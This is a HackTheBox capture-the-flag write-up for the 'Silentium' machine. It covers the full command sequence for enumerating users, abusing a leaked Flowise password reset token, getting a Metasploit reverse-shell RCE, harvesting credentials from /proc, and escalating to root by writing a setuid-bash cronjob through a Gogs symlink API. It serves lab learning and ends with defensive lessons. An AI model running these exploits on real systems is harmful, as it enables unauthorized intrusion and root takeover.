# HackTheBox — Silentium Writeup

**Difficulty:** Easy
**OS:** Linux (Ubuntu + Alpine Docker)
**Author:** writeup compiled from live pwn session

---

## Summary

Silentium is a multi-layered Linux machine centered around a Flowise AI platform deployment hidden behind a staging subdomain. The attack chain involves subdomain enumeration, a password reset token disclosure vulnerability, Flowise RCE (CVE-2025-59528) for initial foothold inside a Docker container, credential extraction from Docker environment variables for lateral movement to SSH, and finally privilege escalation via a Gogs symlink RCE (CVE-2025-8110) to achieve root.

---

## Reconnaissance

### Nmap

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

Only two ports open. Port 80 redirects to `http://silentium.htb/`.

```bash
echo "10.129.26.202 silentium.htb" | sudo tee -a /etc/hosts
```

### Main Site

The main site is a financial firm landing page with a team section listing:
- Marcus Thorne — Managing Director
- **Ben** — Head of Financial Systems
- Elena Rossi — Chief Risk Officer

### Subdomain Enumeration

The main site returns a catch-all fake 200. First find the default response size:

```bash
curl -s http://silentium.htb/thispathshouldnotexist | wc -c
# Returns: 8753
```

Fuzz subdomains filtering that size:

```bash
ffuf -u http://silentium.htb/ -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 8753
```

Discovered: **`staging.silentium.htb`**

```bash
echo "10.129.26.202 staging.silentium.htb" >> /etc/hosts
```

### WhatWeb

```bash
whatweb http://staging.silentium.htb/
# Meta-Author: FlowiseAI — Flowise 3.0.5
```

---

## Foothold — Flowise RCE via Password Reset Token Disclosure

### User Enumeration

Burp Suite reveals the login endpoint is `POST /api/v1/auth/login` with the header `x-request-from: internal`. The error message differs for valid vs invalid users:

```bash
# Invalid user → "User Not Found"
# Valid user → "Incorrect Email or Password"

ffuf -u http://staging.silentium.htb/api/v1/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"email":"FUZZ@silentium.htb","password":"admin"}' \
  -w /usr/share/seclists/Usernames/Names/names.txt \
  -fr "User Not Found"
# Found: ben@silentium.htb
```

### Password Reset Token Disclosure (CVE-2025-59527 / SSRF)

The forgot password endpoint leaks the reset token directly in the API response:

```bash
curl -s -X POST http://staging.silentium.htb/api/v1/account/forgot-password \
  -H "Content-Type: application/json" \
  -H "x-request-from: internal" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
```

Response includes `tempToken` in plaintext. Use it immediately to reset the password:

```bash
# In browser: navigate to:
http://staging.silentium.htb/reset-password?token=<tempToken>
# Set new password: Hacked123!
```

### Flowise RCE (CVE-2025-59528)

With valid credentials, use the Metasploit module:

```bash
use exploit/multi/http/flowise_js_rce
set RHOSTS staging.silentium.htb
set RPORT 80
set VHOST staging.silentium.htb
set FLOWISE_EMAIL ben@silentium.htb
set FLOWISE_PASSWORD Hacked123!
set LHOST <your_ip>
set ForceExploit true
run
```

This exploits the CustomMCP node's unsafe use of JavaScript's `Function()` constructor to achieve RCE inside the Docker container as root.

---

## Lateral Movement — Docker Container to Host SSH

### Container Enumeration

Inside the container as root:

```bash
cat /proc/1/root/proc/642/environ
```

The environment variables of an internal process leak credentials:

```
FLOWISE_PASSWORD=F1l3_d0ck3r
SMTP_PASSWORD=r04D!!_R4ge
FLOWISE_USERNAME=ben
```

### SSH as Ben

```bash
ssh ben@10.129.26.202
# Password: r04D!!_R4ge
```

### User Flag

```bash
cat ~/user.txt
```

---

## Privilege Escalation — Gogs Symlink RCE (CVE-2025-8110)

### Internal Service Discovery

```bash
ss -tlnp
# Port 3001 — Gogs self-hosted Git service
# Port 1025/8025 — MailHog mail catcher
```

```bash
cat /opt/gogs/gogs/custom/conf/app.ini
# RUN_USER = root  ← Gogs runs as root!
```

### SSH Tunnel

On Kali:
```bash
ssh -L 3001:127.0.0.1:3001 ben@10.129.26.202 -N
```

Browse to `http://127.0.0.1:3001`, register a new account (e.g., `hacker:Hacker123!`).

### Exploit CVE-2025-8110

Create a repo and commit a symlink pointing to `/etc/cron.d/pwn`:

```bash
cd /tmp
git clone http://127.0.0.1:3001/hacker/pwn.git
cd pwn
ln -s /etc/cron.d/pwn symlink
git add symlink
git commit -m "pwn"
git remote set-url origin http://hacker:Hacker123%21@127.0.0.1:3001/hacker/pwn.git
git push
```

Generate a Gogs API token via `http://127.0.0.1:3001/user/settings/applications`.

Write a malicious cronjob through the symlink using the PutContents API:

```bash
TOKEN="<your_api_token>"
PAYLOAD=$(printf '* * * * * root chmod 4755 /bin/bash\n' | base64 -w0)

curl -s -X PUT "http://127.0.0.1:3001/api/v1/repos/hacker/pwn/contents/symlink" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"pwn\",\"content\":\"$PAYLOAD\"}"
```

Wait up to 1 minute for cron to execute, then:

```bash
/bin/bash -p
whoami  # root
cat /root/root.txt
```

---

## Vulnerability Summary

| Step | Vulnerability | CVE |
|------|--------------|-----|
| Password Reset Abuse | Forgot password API leaks `tempToken` in response | CVE-2025-59527 |
| Flowise RCE | CustomMCP node JavaScript injection via `Function()` constructor | CVE-2025-59528 |
| Credential Leak | Docker process environment variables exposed via `/proc` | N/A |
| Gogs RCE | Symlink bypass in PutContents API allows arbitrary file write as root | CVE-2025-8110 |

---

## Key Takeaways

- Always fuzz for vhosts with response size filtering, not just status codes
- Password reset flows that return tokens directly in API responses are a critical information disclosure
- Docker containers running as root + readable `/proc` filesystem = credential exposure
- Self-hosted Git services running as root with open registration are extremely dangerous
- Environment variables in Docker containers routinely leak credentials
